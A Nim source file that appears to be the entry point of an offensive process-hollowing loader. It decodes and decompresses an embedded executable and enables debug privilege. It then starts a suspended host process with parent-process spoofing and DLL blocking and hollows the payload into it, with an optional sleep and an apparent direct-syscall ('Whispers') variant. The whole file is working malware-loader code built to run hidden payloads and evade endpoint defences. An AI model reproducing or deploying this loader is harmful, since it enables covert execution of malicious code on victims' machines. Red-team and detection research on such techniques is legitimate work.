# Internal
import utils
import params
# External
import os
import winim
from std/base64 import decode
from zip/zlib import uncompress

# Import per module chosen
when defined(hollowsimple):
    import hollowsimple
when defined(hollownimline):
    import hollowNimlineWhispers


proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =

    # Sleep at execution
    sleep(sleepSeconds * 1000)

    # Decode and decompress PE
    var compressedPe = decode(compressedBase64PE)
    var peStr = uncompress(compressedPe)

    # Enable debug privilege
    discard setDebugPrivilege()
    
    # Create suspended process with extended attributes (ppid, block dll's)
    var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)

    # Execute module
    when defined(hollowsimple):
        return simpleHollow(peStr, ppi)
    when defined(hollownimline):
        return nimlineHollow(peStr, ppi)


proc main*() =
    discard execute(
        compressedBase64PE = compressedBase64PE, 
        sponsorCmd = sponsorPath & sponsorParams,
        isBlockDlls = isBlockDlls,
        sleepSeconds = sleepSeconds
    )


when isMainModule:
    main()